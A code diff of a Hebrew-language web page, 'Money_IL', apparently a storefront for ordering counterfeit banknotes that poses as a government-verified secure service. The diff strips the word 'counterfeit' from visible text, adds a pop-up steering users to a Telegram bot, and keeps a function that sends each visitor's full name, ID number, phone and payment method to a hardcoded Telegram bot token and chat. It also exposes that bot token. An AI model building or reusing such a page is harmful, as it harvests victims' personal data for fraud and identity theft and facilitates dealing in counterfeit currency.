@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Money_IL - מערכת להזמנת שטרות מזויפים (Wizard)</title>
+  <title>Money_IL - מערכת להזמנת שטרות (Wizard)</title>
   <style>
     :root {
       --gov-navy: #0b192c;
@@ -92,6 +92,30 @@
     }
     .btn-gov:hover { background: var(--gov-blue-dark); }
 
+    /* עיצוב החלון הקופץ (Modal) לבחירת יצירת קשר בבוט */
+    .modal-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(11, 25, 44, 0.7); backdrop-filter: blur(4px);
+      display: none; justify-content: center; align-items: center; z-index: 9999;
+    }
+    .modal-card {
+      background: white; width: 90%; max-width: 420px; border-radius: 16px;
+      padding: 24px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+      animation: scaleIn 0.3s ease;
+    }
+    @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .modal-icon { width: 50px; height: 50px; background: #e0f2fe; color: var(--gov-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 24px; }
+    .modal-title { font-size: 18px; font-weight: 800; color: var(--gov-navy); margin-bottom: 10px; }
+    .modal-desc { font-size: 13.5px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5; }
+    .btn-telegram {
+      display: block; width: 100%; padding: 14px; background: #0088cc; color: white; text-decoration: none;
+      border-radius: 8px; font-size: 15px; font-weight: 700; margin-bottom: 10px; box-shadow: 0 4px 12px rgba(0,136,204,0.3); transition: background 0.2s;
+    }
+    .btn-telegram:hover { background: #006699; }
+    .btn-close-modal {
+      background: none; border: none; color: var(--text-muted); font-size: 13px; font-weight: 600; cursor: pointer; padding: 6px;
+    }
+
     footer { padding: 20px 16px; text-align: center; font-size: 11.5px; color: var(--text-muted); border-top: 1px solid #e2e8f0; background: white; margin-top: 25px; }
     .footer-sec-line { display: flex; justify-content: center; align-items: center; gap: 16px; margin-bottom: 8px; font-weight: 600; color: #334155; }
     .sec-item { display: flex; align-items: center; gap: 5px; }
@@ -109,7 +133,7 @@
       </svg>
       <div>
         <h1 class="brand-title">Money_IL</h1>
-        <p class="brand-sub">תוכנת הזמנת שטרות מזויפים</p>
+        <p class="brand-sub">תוכנת הזמנת שטרות</p>
       </div>
     </div>
     <div class="sec-tag"><div class="sec-dot"></div><span>GOV-SEC</span></div>
@@ -131,7 +155,7 @@
         <div class="wizard-step-content active" id="wStep1">
           <div class="form-group"><label>הכנס סכום העסקה בשקלים (₪) *</label><input type="number" id="investmentAmount" value="5000" min="100" step="100"></div>
           <div class="form-group">
-            <label>מטבע מזוייף רצוי *</label>
+            <label>מטבע רצוי *</label>
             <select id="currencyType">
               <option value="ILS" selected>שקל חדש (₪ - ILS)</option>
               <option value="USD">דולר אמריקאי ($ - USD)</option>
@@ -184,6 +208,20 @@
     </div>
   </div>
 
+  <!-- חלון קופץ (Modal) ליצירת קשר בבוט טלגרם במקביל לשליחה -->
+  <div class="modal-overlay" id="telegramModal">
+    <div class="modal-card">
+      <div class="modal-icon">✈️</div>
+      <div class="modal-title">ההזמנה שודרה בהצלחה!</div>
+      <div class="modal-desc">
+        הפרטים נשלחו למערכת המאובטחת.<br>כדי להתקדם ולקבל מענה מהיר, לחץ על הכפתור למטה והתחל שיחה מיידית מול הבוט הרשמי שלנו בטלגרם:
+      </div>
+      <a href="https://t.me/Movie_run_bot" target="_blank" class="btn-telegram">פתח שיחה עם @Movie_run_bot ↗</a>
+      <br>
+      <button class="btn-close-modal" onclick="closeModal()">סגור חלון</button>
+    </div>
+  </div>
+
   <footer>
     <div class="footer-sec-line">
       <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg><span>הצפנת AES-256</span></div>
@@ -192,7 +230,7 @@
       <span>•</span>
       <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg><span>מאומת GOV</span></div>
     </div>
-    <div>© 2026 Money_IL - רכישת שטרות מזויפים . כל הזכויות שמורות.</div>
+    <div>© 2026 Money_IL - כל הזכויות שמורות.</div>
   </footer>
 
   <script>
@@ -261,11 +299,11 @@
       document.getElementById('resTotal').innerText = `${(totalReturn / rate).toLocaleString('he-IL', {maximumFractionDigits: 2})} ${symbol}`;
     }
 
-                function submitToTelegram() {
-      // שליפת כל הפרטים שהוזנו מהזיכרון ומטופסי השלבים הקודמים
+    function submitToTelegram() {
+      // שליפת כל הפרטים מהזיכרון המקומי (localStorage) שהוזנו בעמוד index
       const userName = localStorage.getItem('sub_user_name') || 'לא ידוע';
       const userPayment = localStorage.getItem('sub_user_payment') || 'לא צוין';
-      const userIdNum = localStorage.getItem('sub_user_id') || 'לא צוין'; // במידה ונשמר, או שולפים ישירות מהאינפוט אם קיים
+      const userIdNum = localStorage.getItem('sub_user_id') || 'לא צוין';
       const userPhone = localStorage.getItem('sub_user_phone') || 'לא צוין';
       
       const investment = document.getElementById('investmentAmount').value;
@@ -275,7 +313,7 @@
       const cityName = opt === 'yes' ? citySelect.options[citySelect.selectedIndex].text : 'ללא משלוח';
       const totalRes = document.getElementById('resTotal').innerText;
 
-      // עיצוב הודעת הטלגרם כך שתכלול את כל הנתונים המלאים
+      // עיצוב ההודעה המלאה לבוט הטלגרם
       const message = `🛡️ *[GOV-SEC] תיק משתמש והשקעה מלא* 🛡️\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
                       `👤 *שם מלא:* ${userName}\n` +
@@ -283,7 +321,7 @@
                       `📞 *טלפון נייד:* ${userPhone}\n` +
                       `💳 *אמצעי תשלום:* ${userPayment}\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
-                      `💰 *סכום השקעה:* ${investment} ₪\n` +
+                      `💰 *סכום קנייה:* ${investment} ₪\n` +
                       `💱 *מטבע יעד:* ${currency}\n` +
                       `📦 *יעד משלוח:* ${cityName}\n` +
                       `📈 *תשואה סופית:* ${totalRes}\n` +
@@ -293,16 +331,27 @@
       const botToken = '8900098820:AAE2BhJ9qCI00UpOMLfOUc61613FpS_UA64';
       const chatId = '8017590244';
 
+      // שליחה אסינכרונית לטלגרם
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
       })
       .then(response => {
-        if (response.ok) alert('כל פרטי הלקוח וההזמנה שודרו בהצלחה!');
-        else alert('שגיאה בשליחת הנתונים לטלגרם.');
+        if (response.ok) {
+          console.log('הנתונים שודרו בהצלחה לטלגרם');
+        } else {
+          console.error('שגיאה בשליחת הנתונים לטלגרם');
+        }
       })
       .catch(error => { console.error('Error:', error); });
+
+      // הצגת החלון הקופץ (Modal) במקביל לפעולת השליחה
+      document.getElementById('telegramModal').style.display = 'flex';
+    }
+
+    function closeModal() {
+      document.getElementById('telegramModal').style.display = 'none';
     }
 
     document.addEventListener('keydown', function(e) {
